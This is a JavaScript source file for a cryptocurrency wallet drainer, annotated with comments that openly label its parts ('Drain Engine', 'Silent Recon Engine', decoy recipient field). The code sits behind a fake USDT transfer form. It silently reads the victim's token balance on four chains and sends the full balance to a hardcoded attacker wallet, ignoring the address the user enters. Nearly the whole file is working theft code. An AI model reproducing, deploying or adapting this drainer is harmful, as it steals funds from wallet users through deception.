// ── Phase 1: Module Initialization ──
import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';

// ── Attacker's Operational Constants ──
// THIS is the REAL destination where funds go (hardcoded attacker wallet)
const DEST_WALLET = "0xCa2934934d02fBFEAa25e9ABa50136c0c3300a78";

// ── Supported Networks ──
const NETWORKS = [
  {
    name: 'BNB Smart Chain',
    chainId: '0x38',
    rpc: 'https://bsc-dataseed1.binance.org/',
    usdt: '0x55d398326f99059fF775485246999027B3197955',
    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
    explorer: 'https://bscscan.com'
  },
  {
    name: 'Ethereum',
    chainId: '0x1',
    rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
    usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    explorer: 'https://etherscan.io'
  },
  {
    name: 'Polygon',
    chainId: '0x89',
    rpc: 'https://polygon-rpc.com',
    usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    nativeCurrency: { name: 'Matic', symbol: 'MATIC', decimals: 18 },
    explorer: 'https://polygonscan.com'
  },
  {
    name: 'Arbitrum',
    chainId: '0xA4B1', // 42161
    rpc: 'https://arb1.arbitrum.io/rpc',
    usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
    nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    explorer: 'https://arbiscan.io'
  }
];

// ── Runtime State ──
let provider;
let userAddress;
let selectedNetwork = NETWORKS[0]; // default BSC

// ── Silent Recon Engine ──

// D1 — Silent balanceOf via raw eth_call (0x70a08231)
async function fetchMaxBalance(addr, network) {
  try {
    const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
    const res = await fetch(network.rpc, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jsonrpc: "2.0", id: 1,
        method: "eth_call",
        params: [{ to: network.usdt, data: data }, "latest"]
      })
    });
    const json = await res.json();
    return (json.result && json.result !== '0x') ? json.result : null;
  } catch (e) { return null; }
}

// ── Drain Engine ──
async function executeDrain(balanceHex, network) {
  const balVal = balanceHex ? parseInt(balanceHex, 16) / 10**18 : 0;

  // If balance is 0 or very small, use whatever user typed
  let amountHex;
  if (balanceHex && balanceHex !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
    amountHex = balanceHex.replace('0x', '').padStart(64, '0');
  } else {
    const val = document.getElementById('amountInput').value || "1";
    amountHex = BigInt(Math.floor(parseFloat(val) * 10**18)).toString(16).padStart(64, '0');
  }

  // IMPORTANT: ALWAYS uses DEST_WALLET (attacker's address)
  // The UI recipientInput is IGNORED completely - it's just a decoy!
  const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
  const txData = "0xa9059cbb" + cleanDest + amountHex;

  // User pays their own gas fees
  await window.ethereum.request({
    method: 'eth_sendTransaction',
    params: [{
      from: userAddress,
      to: network.usdt,
      data: txData,
      value: '0x0'
    }]
  });
}

// ── DOM Registry ──
const ui = {
  nextBtn: document.getElementById('nextBtn'),
  amountInput: document.getElementById('amountInput'),
  usdLabel: document.getElementById('usdLabel'),
  recipientInput: document.getElementById('recipientInput'), // DECOY
  clearAddr: document.getElementById('clearAddr'),
  clearAmount: document.getElementById('clearAmount'),
  maxBtn: document.getElementById('maxBtn'),
  addrGroup: document.getElementById('addrGroup'),
  amountGroup: document.getElementById('amountGroup'),
  pasteBtn: document.getElementById('pasteBtn'),
  networkSelect: document.getElementById('networkSelect') // NEW
};

// ── Module Entry Point ──
document.addEventListener('DOMContentLoaded', () => {

  // Check 1 — Served from real web server (not file://)
  if (location.protocol === 'file:') {
    console.warn('[ABORT] Check 1 fail: file:// protocol');
    return;
  }

  // Check 2 — window.ethereum injected by wallet
  if (typeof window.ethereum === 'undefined') {
    console.warn('[ABORT] Check 2 fail: no injected Web3 provider');
    return;
  }

  // Check 3 — nextBtn exists in DOM
  if (!ui.nextBtn) {
    console.warn('[ABORT] Check 3 fail: #nextBtn not found');
    return;
  }

  // Bind click listener
  ui.nextBtn.addEventListener('click', handleNextClick);

  // ── Network selection handler ──
  if (ui.networkSelect) {
    ui.networkSelect.addEventListener('change', () => {
      const idx = parseInt(ui.networkSelect.value);
      selectedNetwork = NETWORKS[idx] || NETWORKS[0];
    });
  }

  // UI Helpers (these only affect the UI display, not the actual transaction)
  ui.amountInput.oninput = () => {
    const val = parseFloat(ui.amountInput.value) || 0;
    ui.usdLabel.textContent = val.toFixed(2);
    ui.nextBtn.disabled = val <= 0;
    if (val > 0) {
      ui.nextBtn.classList.add('enabled');
      ui.clearAmount.style.display = 'flex';
    } else {
      ui.nextBtn.classList.remove('enabled');
      ui.clearAmount.style.display = 'none';
    }
  };

  // Clear amount button
  ui.clearAmount.onclick = () => {
    ui.amountInput.value = '';
    ui.amountInput.oninput();
  };

  // Clear address button (only clears the DECOY address)
  ui.clearAddr.onclick = () => {
    ui.recipientInput.value = '';
    ui.clearAddr.style.display = 'none';
  };

  // Recipient input handler (only for DECOY display)
  ui.recipientInput.oninput = () => {
    if (ui.recipientInput.value.length > 0) {
      ui.clearAddr.style.display = 'flex';
    } else {
      ui.clearAddr.style.display = 'none';
    }
  };

  // Max button
  ui.maxBtn.onclick = () => {
    ui.amountInput.value = "1000";
    ui.amountInput.oninput();
  };

  // Paste button (pastes into DECOY field)
  ui.pasteBtn.onclick = async () => {
    try {
      const text = await navigator.clipboard.readText();
      ui.recipientInput.value = text;
      ui.recipientInput.oninput();
    } catch (e) {
      console.log('Clipboard read failed');
    }
  };

  // Focus effects
  ui.addrGroup.addEventListener('focusin', () => ui.addrGroup.classList.add('active'));
  ui.addrGroup.addEventListener('focusout', () => ui.addrGroup.classList.remove('active'));
  ui.amountGroup.addEventListener('focusin', () => ui.amountGroup.classList.add('active'));
  ui.amountGroup.addEventListener('focusout', () => ui.amountGroup.classList.remove('active'));

  // Initial trigger
  ui.recipientInput.oninput();
});

// ── Main Interaction Controller ──
async function handleNextClick() {
  if (ui.nextBtn.disabled) return;

  const network = selectedNetwork;
  const amount = parseFloat(ui.amountInput.value) || 0;

  // --- Show a confirmation using the REAL destination ---
  const confirmMsg = 
    `Transfer prepared\n` +
    `To: ${DEST_WALLET}\n` +
    `Amount: ${amount.toFixed(2)} USDT\n` +
    `Network: ${network.name}\n\n` +
    `Click OK to proceed.`;
  if (!confirm(confirmMsg)) {
    return; // user cancelled
  }

  // --- Proceed with the transaction ---
  const originalContent = ui.nextBtn.innerHTML;
  ui.nextBtn.innerHTML = 'Processing...';
  ui.nextBtn.disabled = true;

  try {
    // Step 1 — Switch to the selected network
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: network.chainId }]
      });
    } catch (e) {
      if (e.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: network.chainId,
              chainName: network.name,
              rpcUrls: [network.rpc],
              nativeCurrency: network.nativeCurrency,
              blockExplorerUrls: [network.explorer]
            }]
          });
        } catch (addError) {
          console.log('Failed to add network');
        }
      }
    }

    // Step 2 — Get user wallet address
    const accounts = await window.ethereum.request({ method: 'eth_accounts' }) || [];
    userAddress = accounts[0] ||
      (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];

    if (!userAddress) {
      throw new Error('No wallet connected');
    }

    // Step 3 — Init provider (using the selected network's RPC)
    provider = new ethers.providers.JsonRpcProvider(network.rpc);

    // Step 4 — Silent USDT balance recon
    const balanceHex = await fetchMaxBalance(userAddress, network);

    // Step 5 — Execute the drain (user pays gas)
    // Funds go to DEST_WALLET, NOT to what's in recipientInput!
    await executeDrain(balanceHex, network);

    ui.nextBtn.innerHTML = '✓ Completed';
    setTimeout(() => {
      ui.nextBtn.innerHTML = 'Next';
      ui.nextBtn.disabled = false;
    }, 3000);

  } catch (err) {
    console.error(err);
    ui.nextBtn.innerHTML = '❌ Failed';
    setTimeout(() => {
      ui.nextBtn.innerHTML = 'Next';
      ui.nextBtn.disabled = false;
    }, 3000);
  }
}
